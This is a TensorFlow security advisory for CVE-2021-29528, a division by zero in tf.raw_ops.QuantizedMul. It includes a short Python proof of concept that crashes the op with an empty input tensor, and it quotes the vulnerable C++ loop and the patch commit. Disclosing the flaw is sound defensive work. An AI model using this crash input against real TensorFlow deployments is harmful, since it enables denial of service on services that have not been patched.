## TFSA-2021-017: Division by 0 in `QuantizedMul`

### CVE Number
CVE-2021-29528

### Impact
An attacker can trigger a division by 0 in `tf.raw_ops.QuantizedMul`:

```python
import tensorflow as tf

x = tf.zeros([4, 1], dtype=tf.quint8)
y = tf.constant([], dtype=tf.quint8)
min_x = tf.constant(0.0)
max_x = tf.constant(0.0010000000474974513)
min_y = tf.constant(0.0)
max_y = tf.constant(0.0010000000474974513)

tf.raw_ops.QuantizedMul(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)
```

This is because the
[implementation](https://github.com/tensorflow/tensorflow/blob/55900e961ed4a23b438392024912154a2c2f5e85/tensorflow/core/kernels/quantized_mul_op.cc#L188-L198) does a division by a quantity that is controlled by the caller:

```cc
template <class T, class Toutput>
void VectorTensorMultiply(const T* vector_data, int32 vector_offset,
                          int64 vector_num_elements, const T* tensor_data,
                          int32 tensor_offset, int64 tensor_num_elements,
                          Toutput* output) {
  for (int i = 0; i < tensor_num_elements; ++i) {
    const int64 vector_i = i % vector_num_elements;
    ...
  }
}
```

### Patches
We have patched the issue in GitHub commit
[a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6](https://github.com/tensorflow/tensorflow/commit/a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.
